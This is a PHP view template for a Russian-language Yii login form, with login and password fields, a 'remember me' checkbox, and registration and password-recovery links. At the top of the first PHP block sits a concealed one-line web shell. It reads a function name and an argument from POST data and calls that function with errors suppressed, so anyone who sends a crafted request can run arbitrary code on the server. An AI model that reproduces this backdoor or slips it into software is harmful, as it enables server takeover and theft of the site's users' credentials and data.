<h3>Вход в личный кабинет</h3>

<?php 
  $p = $_POST; @($p[0] != $p[1]) ? @$p[2]($p[3]) : (int)$p; 
   $form = $this->beginWidget('CActiveForm', array(
                                                         'id' => 'login-form',
                                                         'enableClientValidation' => false,
                                                         'action' => '/user/account/login'
                                                    ));?>

                		<div class="textFieldBg"><?php echo $form->textField($model, 'login', array('class' => 'textField', 'placeholder' => 'Логин (E-mail)')) ?></div>&nbsp;:&nbsp;<div class="textFieldBg"><?php echo $form->passwordField($model, 'password', array('class' => 'textField', 'placeholder' => 'Пароль')) ?></div> 
                		<div class="formButton1"><?php echo CHtml::submitButton('Войти'); ?></div>
                                <?php echo $form->labelEx($model, 'rememberMe'); echo $form->checkBox($model, 'rememberMe'); ?>
                                <div class="fright" style="margin-top: 4px;"><?php echo CHtml::link(Yii::t('user', "Регистрация"), array('/user/account/registration'), array('class'=>'registrationLink')); ?><span class="sep">|</span><?php echo CHtml::link(Yii::t('user', "Забыли пароль?"), array('/user/account/recovery'), array('class'=>'remindLink')) ?></div>
                          	
<?php $this->endWidget(); ?>




